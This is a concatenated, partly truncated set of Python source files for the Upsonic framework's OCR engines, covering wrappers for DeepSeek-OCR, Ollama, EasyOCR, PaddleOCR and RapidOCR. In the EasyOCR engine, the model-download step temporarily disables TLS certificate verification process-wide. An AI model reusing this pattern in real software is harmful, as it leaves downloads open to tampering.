def _get_paddleocr_classes():
    """Lazy import of PaddleOCR classes (optional dependency)."""
    try:
        from .paddleocr import (
            PaddleOCRConfig,
            PaddleOCREngine,
            PPStructureV3Engine,
            PPChatOCRv4Engine,
            PaddleOCRVLEngine,
            PaddleOCR,
            PPStructureV3,
            PPChatOCRv4,
            PaddleOCRVL,
        )

        return {
            'PaddleOCRConfig': PaddleOCRConfig,
            'PaddleOCREngine': PaddleOCREngine,
            'PPStructureV3Engine': PPStructureV3Engine,
            'PPChatOCRv4Engine': PPChatOCRv4Engine,
            'PaddleOCRVLEngine': PaddleOCRVLEngine,
            'PaddleOCR': PaddleOCR,
            'PPStructureV3': PPStructureV3,
            'PPChatOCRv4': PPChatOCRv4,
            'PaddleOCRVL': PaddleOCRVL,
        }
    except ImportError:
        return {}


def __getattr__(name: str) -> Any:
    """Lazy loading of engine classes."""
    engine_classes = _get_engine_classes()
    if name in engine_classes:
        return engine_classes[name]

    paddleocr_classes = _get_paddleocr_classes()
    if name in paddleocr_classes:
        return paddleocr_classes[name]

    raise AttributeError(
        f"module '{__name__}' has no attribute '{name}'. "
        f"Available engines: EasyOCREngine, RapidOCREngine, TesseractOCREngine, "
        f"DeepSeekOCREngine, DeepSeekOllamaOCREngine, PaddleOCREngine, "
        f"PPStructureV3Engine, PPChatOCRv4Engine, PaddleOCRVLEngine"
    )


__all__ = [
    "EasyOCREngine",
    "RapidOCREngine",
    "TesseractOCREngine",
    "DeepSeekOCREngine",
    "DeepSeekOllamaOCREngine",
    "PaddleOCRConfig",
    "PaddleOCREngine",
    "PPStructureV3Engine",
    "PPChatOCRv4Engine",
    "PaddleOCRVLEngine",
    "PaddleOCR",
    "PPStructureV3",
    "PPChatOCRv4",
    "PaddleOCRVL",
]

```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/deepseek.py`
```
from __future__ import annotations

import asyncio
from typing import List, Optional, Dict, Any
import os

from upsonic.ocr.base import OCRProvider, OCRConfig, OCRResult, OCRTextBlock
from upsonic.ocr.exceptions import OCRProviderError, OCRProcessingError

try:
    from vllm import LLM, SamplingParams
    _VLLM_AVAILABLE = True
    
    # Try to import NGramPerReqLogitsProcessor (may not be available in all vLLM versions)
    try:
        from vllm.model_executor.models.deepseek_ocr import NGramPerReqLogitsProcessor
        _NGRAM_PROCESSOR_AVAILABLE = True
    except ImportError:
        NGramPerReqLogitsProcessor = None
        _NGRAM_PROCESSOR_AVAILABLE = False
except ImportError:
    LLM = None
    SamplingParams = None
    NGramPerReqLogitsProcessor = None
    _VLLM_AVAILABLE = False
    _NGRAM_PROCESSOR_AVAILABLE = False


class DeepSeekOCREngine(OCRProvider):
    """DeepSeek OCR engine using DeepSeek-OCR model with vLLM.

    This engine uses DeepSeek's specialized OCR model (deepseek-ai/DeepSeek-OCR)
    running locally via vLLM. It provides high-quality OCR with support for complex
    layouts and table structures.

    **Requirements:**
    - vLLM with DeepSeek-OCR support (may require specific vLLM version or custom build)
    - Additional dependencies: `pip install addict matplotlib`
    - Sufficient GPU memory to run the model (typically 16GB+ VRAM)

    **Note:** DeepSeek-OCR model architecture may not be supported in all vLLM versions.
    As of vLLM 0.11.0, the DeepseekOCRForCausalLM architecture is not in the standard
    supported list. You may need a custom vLLM build or an updated version.

    Example:
        >>> from upsonic.ocr.layer_1.engines import DeepSeekOCREngine
        >>> ocr = DeepSeekOCREngine(rotation_fix=True)
        >>> text = ocr.get_text('document.png')
    """
    
    def __init__(
        self,
        config: Optional[OCRConfig] = None,
        model_name: str = "deepseek-ai/DeepSeek-OCR",
        prompt: str = "<image>\nFree OCR.",
        temperature: float = 0.0,
        max_tokens: int = 8192,
        ngram_size: int = 30,
        window_size: int = 90,
        **kwargs
    ):
        """Initialize DeepSeek OCR provider.
        
        Args:
            config: OCRConfig object
            model_name: Model name or path to custom model. Can be:
                - HuggingFace model identifier (e.g., "deepseek-ai/DeepSeek-OCR")
                - Local path to a model directory
                - Any model identifier supported by vLLM
                Default: "deepseek-ai/DeepSeek-OCR"
            prompt: OCR prompt template (default: "<image>\nFree OCR.")
            temperature: Sampling temperature (default: 0.0 for deterministic output)
            max_tokens: Maximum tokens to generate (default: 8192)
            ngram_size: N-gram size for logits processor (default: 30)
            window_size: Window size for logits processor (default: 90)
            **kwargs: Additional configuration arguments
        """
        self.model_name = model_name
        self.prompt = prompt
        self.temperature = temperature
        self.max_tokens = max_tokens
        self.ngram_size = ngram_size
        self.window_size = window_size
        self._llm = None
        self._sampling_params = None
        super().__init__(config, **kwargs)
    
    @property
    def name(self) -> str:
        return "deepseek_ocr"
    
    @property
    def supported_languages(self) -> List[str]:
        """DeepSeek-OCR supports multiple languages."""
        return [
            'en', 'zh', 'ja', 'ko', 'es', 'fr', 'de', 'it', 'pt', 'ru',
            'ar', 'hi', 'th', 'vi', 'id', 'ms', 'tr', 'pl', 'nl', 'uk'
        ]
    
    def _validate_dependencies(self) -> None:
        """Validate that required dependencies are installed."""
        if not _VLLM_AVAILABLE:
            from upsonic.utils.printing import import_error
            import_error(
                package_name="vllm",
                install_command='pip install vllm',
                feature_name="DeepSeek OCR provider"
            )
        
        missing_deps = []
        try:
            import addict
        except ImportError:
            missing_deps.append('addict')
        
        try:
            import matplotlib
        except ImportError:
            missing_deps.append('matplotlib')
        
        if missing_deps:
            from upsonic.utils.printing import import_error
            import_error(
                package_name=', '.join(missing_deps),
                install_command=f'pip install {" ".join(missing_deps)}',
                feature_name="DeepSeek OCR provider (additional dependencies)"
            )
    
    def _get_reader(self):
        """Get or create the vLLM instance (thread-safe).

        Returns the same object as ``_get_llm()`` — provided for
        base-class contract compliance.
        """
        return self._get_llm()

    def _get_llm(self) -> LLM:
        """Get or create vLLM instance (thread-safe)."""
        if self._llm is not None:
            return self._llm
        with self._reader_lock:
            if self._llm is not None:
                return self._llm
            if not _VLLM_AVAILABLE:
                raise OCRProviderError(
                    "vLLM is not available. Please install vLLM: pip install vllm",
                    error_code="VLLM_NOT_AVAILABLE"
                )
            
            from upsonic.utils.printing import ocr_language_warning, ocr_loading, ocr_initialized
            
            unsupported_langs = [lang for lang in self.config.languages if lang not in self.supported_languages]
            if unsupported_langs:
                ocr_language_warning(
                    provider_name="DeepSeek-OCR",
                    warning_langs=unsupported_langs,
                    best_supported=self.supported_languages
                )
            
            extra_info = {
                "Model": self.model_name,
                "Temperature": str(self.temperature),
                "Max tokens": str(self.max_tokens),
                "Note": "This may take a few minutes on first run"
            }
            ocr_loading("DeepSeek-OCR", self.config.languages, extra_info)
            
            try:
                llm_kwargs = {
                    'model': self.model_name,
                    'enable_prefix_caching': False,
                    'mm_processor_cache_gb': 0,
                }
                
                # Add logits processors only if available
                if _NGRAM_PROCESSOR_AVAILABLE and NGramPerReqLogitsProcessor is not None:
                    llm_kwargs['logits_processors'] = [NGramPerReqLogitsProcessor]
                
                self._llm = LLM(**llm_kwargs)
                ocr_initialized("DeepSeek-OCR")
            except Exception as e:
                error_msg = str(e)
                
                if 'not supported for now' in error_msg or 'DeepseekOCRForCausalLM' in error_msg:
                    raise OCRProviderError(
                        f"[UNSUPPORTED_MODEL_ARCHITECTURE] DeepSeek-OCR model architecture is not supported in your vLLM version. "
                        f"The '{self.model_name}' model requires either:\n"
                        f"  1. A newer version of vLLM that supports DeepseekOCRForCausalLM\n"
                        f"  2. A custom vLLM build with DeepSeek-OCR support\n"
                        f"  3. Use an alternative model or OCR provider (RapidOCR, EasyOCR, Tesseract)\n"
                        f"Original error: {error_msg}",
                        error_code="UNSUPPORTED_MODEL_ARCHITECTURE",
                        original_error=e
                    )
                
                raise OCRProviderError(
                    f"Failed to initialize DeepSeek-OCR model: {error_msg}",
                    error_code="MODEL_INIT_FAILED",
                    original_error=e
                )
        return self._llm
    
    def _get_sampling_params(self) -> SamplingParams:
        """Get or create sampling parameters."""
        if self._sampling_params is None:
            # Build sampling params
            params_kwargs = {
                'temperature': self.temperature,
                'max_tokens': self.max_tokens,
                'skip_special_tokens': False,
            }
            
            # Add ngram parameters only if the processor is available
            if _NGRAM_PROCESSOR_AVAILABLE:
                params_kwargs['extra_args'] = dict(
                    ngram_size=self.ngram_size,
                    window_size=self.window_size,
                    whitelist_token_ids={128821, 128822},  # whitelist: <td>, </td>
                )
            
            self._sampling_params = SamplingParams(**params_kwargs)
        return self._sampling_params
    
    def _process_image(self, image, **kwargs) -> OCRResult:
        """Process a single image with DeepSeek-OCR model.
        
        Args:
            image: PIL Image object
            **kwargs: Additional arguments (prompt customization, etc.)
            
        Returns:
            OCRResult object
        """
        try:
            if image.mode not in ('RGB', 'L'):
                image = image.convert('RGB')
            
            prompt = kwargs.get('prompt', self.prompt)
            
            model_input = {
                "prompt": prompt,
                "multi_modal_data": {"image": image}
            }
            
            llm = self._get_llm()
            sampling_params = self._get_sampling_params()
            
            model_outputs = llm.generate([model_input], sampling_params)
            
            extracted_text = model_outputs[0].outputs[0].text.strip()
            
            block = OCRTextBlock(
                text=extracted_text,
                confidence=1.0,  # DeepSeek-OCR doesn't provide confidence scores
                bbox=None,
     
```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/deepseek_ollama.py`
```
from __future__ import annotations

import asyncio
from typing import List, Optional
from pathlib import Path
import tempfile
import time
import threading

from upsonic.ocr.base import OCRProvider, OCRConfig, OCRResult, OCRTextBlock
from upsonic.ocr.exceptions import OCRProviderError, OCRProcessingError

try:
    from ollama import Client
    _OLLAMA_AVAILABLE = True
except ImportError:
    Client = None
    _OLLAMA_AVAILABLE = False


class DeepSeekOllamaOCREngine(OCRProvider):
    """DeepSeek OCR engine using Ollama with deepseek-ocr model.

    This engine uses DeepSeek's OCR model running locally via Ollama.
    It provides high-quality OCR with support for complex layouts.

    **Requirements:**
    - Ollama installed and running locally
    - DeepSeek OCR model: `ollama pull deepseek-ocr:3b`
    - Python ollama package: `pip install ollama`

    Example:
        >>> from upsonic.ocr.layer_1.engines import DeepSeekOllamaOCREngine
        >>> ocr = DeepSeekOllamaOCREngine(rotation_fix=True)
        >>> text = ocr.get_text('document.png')
    """
    
    def __init__(
        self,
        config: Optional[OCRConfig] = None,
        host: str = 'http://localhost:11434',
        model: str = 'deepseek-ocr:3b',
        prompt: str = r"\nFree OCR.",
        timeout: float = 60.0,
        **kwargs
    ):
        """Initialize DeepSeek Ollama OCR provider.
        
        Args:
            config: OCRConfig object
            host: Ollama server host (default: 'http://localhost:11434')
            model: Model name (default: 'deepseek-ocr:3b')
            prompt: OCR prompt template (default: r"\nFree OCR.")
            timeout: Timeout in seconds for streaming response (default: 60.0)
            **kwargs: Additional configuration arguments
        """
        self.host = host
        self.model = model
        self.prompt = prompt
        self.timeout = timeout
        self._client = None
        super().__init__(config, **kwargs)
    
    @property
    def name(self) -> str:
        return "deepseek_ollama_ocr"
    
    @property
    def supported_languages(self) -> List[str]:
        """DeepSeek-OCR supports multiple languages."""
        return [
            'en', 'zh', 'ja', 'ko', 'es', 'fr', 'de', 'it', 'pt', 'ru',
            'ar', 'hi', 'th', 'vi', 'id', 'ms', 'tr', 'pl', 'nl', 'uk'
        ]
    
    def _validate_dependencies(self) -> None:
        """Validate that required dependencies are installed."""
        if not _OLLAMA_AVAILABLE:
            from upsonic.utils.printing import import_error
            import_error(
                package_name="ollama",
                install_command='pip install ollama',
                feature_name="DeepSeek Ollama OCR provider"
            )
    
    def _get_reader(self):
        """Get or create Ollama client instance (thread-safe).

        Returns the same object as ``_get_client()``.
        """
        return self._get_client()

    def _get_client(self) -> Client:
        """Get or create Ollama client instance (thread-safe)."""
        if self._client is not None:
            return self._client
        with self._reader_lock:
            if self._client is not None:
                return self._client
            if not _OLLAMA_AVAILABLE:
                raise OCRProviderError(
                    "Ollama is not available. Please install ollama: pip install ollama",
                    error_code="OLLAMA_NOT_AVAILABLE"
                )

            from upsonic.utils.printing import ocr_language_warning, ocr_loading, ocr_initialized

            unsupported_langs = [lang for lang in self.config.languages if lang not in self.supported_languages]
            if unsupported_langs:
                ocr_language_warning(
                    provider_name="DeepSeek-OCR (Ollama)",
                    warning_langs=unsupported_langs,
                    best_supported=self.supported_languages
                )

            extra_info = {
                "Model": self.model,
                "Host": self.host,
                "Backend": "Ollama",
                "Note": "Make sure Ollama is running and the model is pulled"
            }
            ocr_loading("DeepSeek-OCR (Ollama)", self.config.languages, extra_info)

            try:
                self._client = Client(host=self.host)
                ocr_initialized("DeepSeek-OCR (Ollama)")
            except Exception as e:
                raise OCRProviderError(
                    f"Failed to initialize Ollama client: {str(e)}. "
                    f"Make sure Ollama is running at {self.host}",
                    error_code="CLIENT_INIT_FAILED",
                    original_error=e
                )
        return self._client
    
    def _process_image(self, image, **kwargs) -> OCRResult:
        """Process a single image with DeepSeek-OCR model via Ollama.
        
        Args:
            image: PIL Image object
            **kwargs: Additional arguments (prompt customization, etc.)
            
        Returns:
            OCRResult object
        """
        try:
            # Convert image to RGB if necessary
            if image.mode not in ('RGB', 'L'):
                image = image.convert('RGB')
            
            # Save image to temporary file since Ollama needs file path
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp_file:
                image.save(tmp_file.name, format='PNG')
                tmp_path = tmp_file.name
            
            try:
                prompt = kwargs.get('prompt', self.prompt)
                timeout = kwargs.get('timeout', self.timeout)
                client = self._get_client()
                
                # Variables for timeout control
                result_data = {
                    'text': '',
                    'timeout_reached': False,
                    'processing_time': 0.0,
                    'chunk_count': 0
                }
                start_time = time.time()
                stop_flag = threading.Event()
                
                def stream_with_timeout():
                    """Stream response in a separate thread"""
                    try:
                        stream = client.chat(
                            model=self.model,
                            messages=[
                                {
                                    'role': 'user',
                                    'content': prompt,
                                    'images': [tmp_path],
                                }
                            ],
                            stream=True,
                        )
                        
                        for chunk in stream:
                            result_data['chunk_count'] += 1
                            
                            # Check timeout in thread
                            current_time = time.time()
                            elapsed = current_time - start_time
                            
                            if elapsed > timeout:
                                result_data['timeout_reached'] = True
                                break
                            
                            # Check if we should stop from outside
                            if stop_flag.is_set():
                                result_data['timeout_reached'] = True
                                break
                            
                            # Add chunk content
                            if hasattr(chunk, 'message') and hasattr(chunk.message, 'content'):
                                if chunk.message.content:
                                    result_data['text'] += chunk.message.content
                    except Exception:
                        pass
                    finally:
                        result_data['processing_time'] = time.time() - start_time
                
                # Start streaming thread
                stream_thread = threading.Thread(target=stream_with_timeout, daemon=True)
                stream_thread.start()
                
                # Wait with timeout
                stream_thread.join(timeout=timeout + 0.5)
                
                # If thread is still alive, force stop
                if stream_thread.is_alive():
                    stop_flag.set()
                    result_data['timeout_reached'] = True
                    # Wait a bit more for graceful shutdown
                    stream_thread.join(timeout=0.5)
                
                # Ensure processing_time is set
                if result_data['processing_time'] == 0.0:
                    result_data['processing_time'] = time.time() - start_time
                
                extracted_text = result_data['text'].strip()
                
                block = OCRTextBlock(
                    text=extracted_text,
                    confidence=1.0,
                    bbox=None,
                    language=None
                )
                
                metadata = {
                    'model': self.model,
                    'host': self.host,
                    'backend': 'ollama',
                    'prompt': prompt,
                    'streaming': True,
                    'timeout_reached': result_data['timeout_reached'],
                    'timeout_duration': timeout,
                    'processing_time': result_data['processing_time'],
                    'chunk_count': result_data['chunk_count'],
                }
                
                return OCRResult(
                    text=extracted_text,
                    blocks=[block],
                    confidence=1.0,
                    page_count=1,
                    provider=self.name,
                    metadata=metadata
                )
            finally:
                # Clean up temporary file
                import os
                try:
                    os.unlink(tmp_path)
        
```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/easyocr.py`
```
from __future__ import annotations

from typing import List, Optional
import numpy as np

from upsonic.ocr.base import OCRProvider, OCRConfig, OCRResult, OCRTextBlock, BoundingBox
from upsonic.ocr.exceptions import OCRProviderError, OCRProcessingError

try:
    import easyocr
    _EASYOCR_AVAILABLE = True
except ImportError:
    easyocr = None
    _EASYOCR_AVAILABLE = False


class EasyOCREngine(OCRProvider):
    """EasyOCR engine for text extraction.

    EasyOCR is a ready-to-use OCR with 80+ supported languages.
    It uses deep learning models for high-accuracy text detection and recognition.

    Example:
        >>> from upsonic.ocr.layer_1.engines import EasyOCREngine
        >>> ocr = EasyOCREngine(languages=['en'], rotation_fix=True)
        >>> text = ocr.get_text('document.pdf')
    """
    
    def __init__(
        self, 
        config: Optional[OCRConfig] = None, 
        gpu: bool = False,
        model_storage_directory: Optional[str] = None,
        download_enabled: bool = True,
        **kwargs
    ):
        """Initialize EasyOCR provider.
        
        Args:
            config: OCRConfig object
            gpu: Whether to use GPU acceleration
            model_storage_directory: Path to directory where models are stored/downloaded.
                If None, uses EasyOCR's default location (~/.EasyOCR/model)
            download_enabled: Whether to allow automatic model downloads (default: True)
            **kwargs: Additional configuration arguments
        """
        self.gpu = gpu
        self.model_storage_directory = model_storage_directory
        self.download_enabled = download_enabled
        self._reader = None
        super().__init__(config, **kwargs)
    
    @property
    def name(self) -> str:
        return "easyocr"
    
    @property
    def supported_languages(self) -> List[str]:
        """EasyOCR supports 80+ languages."""
        return [
            'en', 'zh', 'ja', 'ko', 'th', 'vi', 'ar', 'ru', 'de', 'fr', 
            'es', 'pt', 'it', 'nl', 'pl', 'tr', 'hi', 'bn', 'ta', 'te',
            'mr', 'ne', 'pa', 'si', 'ur', 'fa', 'he', 'el', 'cs', 'da',
            'fi', 'hu', 'id', 'ms', 'no', 'ro', 'sv', 'uk', 'bg', 'hr',
            'lt', 'lv', 'et', 'ga', 'is', 'mk', 'mt', 'sk', 'sl', 'sq',
        ]
    
    def _validate_dependencies(self) -> None:
        """Validate that EasyOCR is installed."""
        if not _EASYOCR_AVAILABLE:
            from upsonic.utils.printing import import_error
            import_error(
                package_name="easyocr",
                install_command='pip install easyocr',
                feature_name="EasyOCR provider"
            )
    
    def _get_reader(self):
        """Get or create EasyOCR reader instance (thread-safe)."""
        if self._reader is not None:
            return self._reader
        with self._reader_lock:
            # Double-check after acquiring lock
            if self._reader is not None:
                return self._reader
            try:
                from upsonic.utils.printing import ocr_language_not_supported, ocr_loading, ocr_initialized

                # Check language support
                unsupported_langs = [lang for lang in self.config.languages if lang not in self.supported_languages]
                if unsupported_langs:
                    ocr_language_not_supported(
                        provider_name="EasyOCR",
                        unsupported_langs=unsupported_langs,
                        supported_langs=self.supported_languages,
                        help_url="https://www.jaided.ai/easyocr/"
                    )
                    raise OCRProviderError(
                        f"Language(s) not supported by EasyOCR: {', '.join(unsupported_langs)}",
                        error_code="UNSUPPORTED_LANGUAGE"
                    )

                # Show loading message
                extra_info = {
                    "GPU": "Enabled" if self.gpu else "Disabled",
                    "Note": "First run will download models"
                }
                ocr_loading("EasyOCR", self.config.languages, extra_info)

                # Handle SSL certificate issues during model download
                # EasyOCR downloads models on first use
                import ssl

                # Save original SSL context
                original_context = ssl._create_default_https_context

                try:
                    # Temporarily disable SSL verification for model download
                    ssl._create_default_https_context = ssl._create_unverified_context

                    # Build Reader arguments
                    reader_kwargs = {
                        'gpu': self.gpu,
                        'verbose': False,
                        'download_enabled': self.download_enabled
                    }

                    # Add custom model storage directory if provided
                    if self.model_storage_directory:
                        reader_kwargs['model_storage_directory'] = self.model_storage_directory

                    self._reader = easyocr.Reader(
                        self.config.languages,
                        **reader_kwargs
                    )

                    ocr_initialized("EasyOCR")
                finally:
                    # Restore original SSL context
                    ssl._create_default_https_context = original_context

            except Exception as e:
                raise OCRProviderError(
                    f"Failed to initialize EasyOCR reader: {str(e)}",
                    error_code="READER_INIT_FAILED",
                    original_error=e
                )
        return self._reader
    
    def _process_image(self, image, **kwargs) -> OCRResult:
        """Process a single image with EasyOCR.
        
        Args:
            image: PIL Image object
            **kwargs: Additional arguments (paragraph, detail, etc.)
            
        Returns:
            OCRResult object
        """
        try:
            reader = self._get_reader()
            
            # Convert PIL Image to numpy array
            img_array = np.array(image)
            
            # Perform OCR
            # detail=1 returns bounding boxes and confidence scores
            results = reader.readtext(
                img_array,
                detail=1,
                paragraph=kwargs.get('paragraph', False),
                min_size=kwargs.get('min_size', 10),
                text_threshold=kwargs.get('text_threshold', 0.7),
                low_text=kwargs.get('low_text', 0.4),
                link_threshold=kwargs.get('link_threshold', 0.4),
                canvas_size=kwargs.get('canvas_size', 2560),
                mag_ratio=kwargs.get('mag_ratio', 1.0),
            )
            
            # Process results
            blocks = []
            text_parts = []
            confidences = []
            
            for bbox_coords, text, confidence in results:
                # Filter by confidence threshold
                if confidence < self.config.confidence_threshold:
                    continue
                
                # Extract bounding box coordinates
                # bbox_coords is a list of 4 points: [[x1,y1], [x2,y2], [x3,y3], [x4,y4]]
                x_coords = [point[0] for point in bbox_coords]
                y_coords = [point[1] for point in bbox_coords]
                
                bbox = BoundingBox(
                    x=min(x_coords),
                    y=min(y_coords),
                    width=max(x_coords) - min(x_coords),
                    height=max(y_coords) - min(y_coords),
                    confidence=confidence
                )
                
                block = OCRTextBlock(
                    text=text,
                    confidence=confidence,
                    bbox=bbox,
                    language=None  # EasyOCR doesn't return per-block language
                )
                
                blocks.append(block)
                text_parts.append(text)
                confidences.append(confidence)
            
            # Combine text
            combined_text = " ".join(text_parts) if text_parts else ""
            avg_confidence = sum(confidences) / len(confidences) if confidences else 0.0
            
            return OCRResult(
                text=combined_text,
                blocks=blocks,
                confidence=avg_confidence,
                page_count=1,
                provider=self.name
            )
            
        except Exception as e:
            if isinstance(e, OCRProviderError):
                raise
            raise OCRProcessingError(
                f"EasyOCR processing failed: {str(e)}",
                error_code="EASYOCR_PROCESSING_FAILED",
                original_error=e
            )


```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/paddleocr.py`
```
"""PaddleOCR provider

This module provides comprehensive wrappers for all PaddleOCR pipelines:
- PaddleOCR: General OCR with PP-OCRv3/v4/v5 models
- PPStructureV3: Advanced document structure recognition
- PPChatOCRv4: Chat-based OCR with multimodal capabilities
- PaddleOCRVL: Vision-Language OCR for complex documents

All providers are fully compatible with the Upsonic AI agent framework.
"""

from __future__ import annotations

import asyncio
from typing import List, Dict, Any, Optional, Union
from pathlib import Path
import time

from upsonic.ocr.base import (
    OCRProvider,
    OCRConfig,
    OCRResult,
    OCRTextBlock,
    BoundingBox
)
from upsonic.ocr.exceptions import OCRError, OCRProcessingError


class PaddleOCRConfig(OCRConfig):
    """Extended configuration for PaddleOCR providers with all pipeline-specific settings.
    
    This config extends the base OCRConfig to include all PaddleOCR-specific parameters
    while maintaining compatibility with the unified OCR interface.
    """
    
    # Model configurations
    doc_orientation_classify_model_name: Optional[str] = None
    doc_orientation_classify_model_dir: Optional[str] = None
    doc_unwarping_model_name: Optional[str] = None
    doc_unwarping_model_dir: Optional[str] = None
    text_detection_model_name: Optional[str] = None
    text_detection_model_dir: Optional[str] = None
    textline_orientation_model_name: Optional[str] = None
    textline_orientation_model_dir: Optional[str] = None
    text_recognition_model_name: Optional[str] = None
    text_recognition_model_dir: Optional[str] = None
    
    # Batch sizes
    textline_orientation_batch_size: Optional[int] = None
    text_recognition_batch_size: Optional[int] = None
    
    # Feature toggles
    use_doc_orientation_classify: Optional[bool] = None
    use_doc_unwarping: Optional[bool] = None
    use_textline_orientation: Optional[bool] = None
    
    # Text detection parameters
    text_det_limit_side_len: Optional[int] = None
    text_det_limit_type: Optional[str] = None
    text_det_thresh: Optional[float] = None
    text_det_box_thresh: Optional[float] = None
    text_det_unclip_ratio: Optional[float] = None
    text_det_input_shape: Optional[tuple] = None
    
    # Text recognition parameters
    text_rec_score_thresh: Optional[float] = None
    return_word_box: Optional[bool] = None
    text_rec_input_shape: Optional[tuple] = None
    
    # Language and version
    lang: Optional[str] = None
    ocr_version: Optional[str] = None


class BasePaddleOCREngine(OCRProvider):
    """Base class for all PaddleOCR providers with shared functionality.
    
    This abstract base class provides common functionality for all PaddleOCR
    pipeline implementations, ensuring consistent behavior across providers.
    """
    
    def __init__(
        self, 
        config: Optional[Union[OCRConfig, PaddleOCRConfig]] = None,
        **kwargs
    ):
        """Initialize the PaddleOCR provider.
        
        Args:
            config: OCRConfig or PaddleOCRConfig object
            **kwargs: Additional PaddleOCR-specific parameters
        """
        # Convert OCRConfig to PaddleOCRConfig if needed
        if config and not isinstance(config, PaddleOCRConfig):
            config_dict = config.model_dump()
            config_dict.update(kwargs)
            config = PaddleOCRConfig(**config_dict)
            kwargs = {}
        elif config is None:
            config = PaddleOCRConfig(**kwargs)
            kwargs = {}
        
        super().__init__(config=config, **kwargs)
        self._paddle_instance = None
        self._paddle_kwargs = kwargs
        self._get_reader()
    
    def _validate_dependencies(self) -> None:
        """Validate that PaddleOCR is installed."""
        try:
            import paddleocr
            self._paddleocr_available = True
        except ImportError:
            self._paddleocr_available = False
            from upsonic.utils.printing import import_error
            import_error(
                package_name="paddleocr",
                install_command='pip install paddleocr',
                feature_name="PaddleOCR"
            )
    
    def _get_reader(self):
        """Get or lazily create the PaddleOCR instance (thread-safe).

        Delegates to ``_initialize_paddle()`` on first call.
        """
        if self._paddle_instance is not None:
            return self._paddle_instance
        with self._reader_lock:
            if self._paddle_instance is not None:
                return self._paddle_instance
            self._initialize_paddle()
        return self._paddle_instance

    def _initialize_paddle(self) -> None:
        """Initialize the PaddleOCR instance. To be implemented by subclasses."""
        raise NotImplementedError("Subclasses must implement _initialize_paddle")
    
    def _build_paddle_params(self, config: PaddleOCRConfig, **kwargs) -> Dict[str, Any]:
        """Build parameters dictionary for PaddleOCR initialization.
        
        Args:
            config: PaddleOCRConfig object
            **kwargs: Additional parameters
            
        Returns:
            Dictionary of parameters for PaddleOCR
        """
        params = {}
        
        # Add all non-None config values
        config_dict = config.model_dump()
        for key, value in config_dict.items():
            if value is not None:
                params[key] = value
        
        # Override with kwargs
        params.update(kwargs)
        
        # Remove base OCRConfig fields that aren't valid for PaddleOCR
        base_config_fields = {
            'languages', 'confidence_threshold', 'rotation_fix',
            'enhance_contrast', 'remove_noise', 'pdf_dpi', 
            'preserve_formatting'
        }
        params = {k: v for k, v in params.items() if k not in base_config_fields}
        
        # Remove any pydantic internal fields
        internal_fields = {'__class__', '__dict__', '__doc__', '__module__'}
        params = {k: v for k, v in params.items() if k not in internal_fields}
        
        return params
    
    def _process_image(self, image, **kwargs) -> OCRResult:
        """Process a single image and extract text using PaddleOCR.
        
        Args:
            image: PIL Image object
            **kwargs: Additional processing arguments
            
        Returns:
            OCRResult object with extracted text and metadata
        """
        if not self._paddle_instance:
            raise OCRError(
                "PaddleOCR instance not initialized",
                error_code="PROVIDER_NOT_INITIALIZED"
            )
        
        start_time = time.time()
        
        try:
            import numpy as np
            import tempfile
            
            # Save image to temporary file for PaddleOCR (it expects file path)
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                image.save(tmp.name, format='PNG')
                tmp_path = tmp.name
            
            try:
                # Process with PaddleOCR using predict() method
                paddle_result = self._paddle_instance.predict(tmp_path, **kwargs)
                
                # Extract text and metadata from result
                text, blocks, confidence = self._extract_paddle_predict_result(paddle_result)
                
            finally:
                # Clean up temp file
                import os
                try:
                    os.unlink(tmp_path)
                except:
                    pass
            
            processing_time = (time.time() - start_time) * 1000
            
            return OCRResult(
                text=text,
                blocks=blocks,
                confidence=confidence,
                page_count=1,
                processing_time_ms=processing_time,
                provider=self.name,
                metadata={
                    'paddle_result': paddle_result,
                    'config': self.config.model_dump()
                }
            )
            
        except Exception as e:
            raise OCRProcessingError(
                f"PaddleOCR processing failed: {str(e)}",
                error_code="PADDLE_PROCESSING_FAILED",
                original_error=e
            )
    
    def _extract_paddle_predict_result(self, paddle_result: Any) -> tuple[str, List[OCRTextBlock], float]:
        """Extract text from PaddleOCR predict() result.
        
        The predict() method returns result objects which are dict-like with:
        - rec_texts: list of recognized text strings
        - rec_scores: list of confidence scores
        - dt_polys: detection polygons (bounding boxes)
        - rec_boxes: recognition boxes
        
        Args:
            paddle_result: List of result dicts from paddle.predict()
            
        Returns:
            Tuple of (text, blocks, confidence)
        """
        text_parts = []
        blocks = []
        total_confidence = 0.0
        count = 0
        
        # Handle None or empty results
        if not paddle_result:
            return "", [], 0.0
        
        try:
            # PaddleOCR predict() returns a list of result objects (one per page/image)
            for page_idx, res in enumerate(paddle_result):
                # Handle dict-like objects
                if hasattr(res, 'get'):
                    rec_texts = res.get('rec_texts', [])
                    rec_scores = res.get('rec_scores', [])
                    dt_polys = res.get('dt_polys', [])
                    rec_boxes = res.get('rec_boxes', [])
                else:
                    # Fallback for non-dict results
                    rec_texts = getattr(res, 'rec_texts', [])
                    rec_scores = getattr(res, 'rec_scores', [])
                    dt_polys = getattr(res, 'dt_polys', [])
                    rec_boxes = getattr(res, 'rec_boxes', [])
                
          
```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/rapidocr.py`
```
from __future__ import annotations

from typing import List, Optional
import numpy as np

from upsonic.ocr.base import OCRProvider, OCRConfig, OCRResult, OCRTextBlock, BoundingBox
from upsonic.ocr.exceptions import OCRProviderError, OCRProcessingError

try:
    from rapidocr_onnxruntime import RapidOCR as _RapidOCR
    _RAPIDOCR_AVAILABLE = True
except ImportError:
    try:
        from rapidocr_openvino import RapidOCR as _RapidOCR
        _RAPIDOCR_AVAILABLE = True
    except ImportError:
        _RapidOCR = None
        _RAPIDOCR_AVAILABLE = False


class RapidOCREngine(OCRProvider):
    """RapidOCR engine for fast text extraction.

    RapidOCR is a lightweight OCR library based on ONNX Runtime.
    It provides fast inference with support for multiple backends.

    Example:
        >>> from upsonic.ocr.layer_1.engines import RapidOCREngine
        >>> ocr = RapidOCREngine(languages=['en', 'ch'], rotation_fix=True)
        >>> text = ocr.get_text('document.png')
    """
    
    def __init__(
        self, 
        config: Optional[OCRConfig] = None,
        det_model_path: Optional[str] = None,
        rec_model_path: Optional[str] = None,
        cls_model_path: Optional[str] = None,
        **kwargs
    ):
        """Initialize RapidOCR provider.
        
        Args:
            config: OCRConfig object
            det_model_path: Path to custom text detection model file (ONNX format)
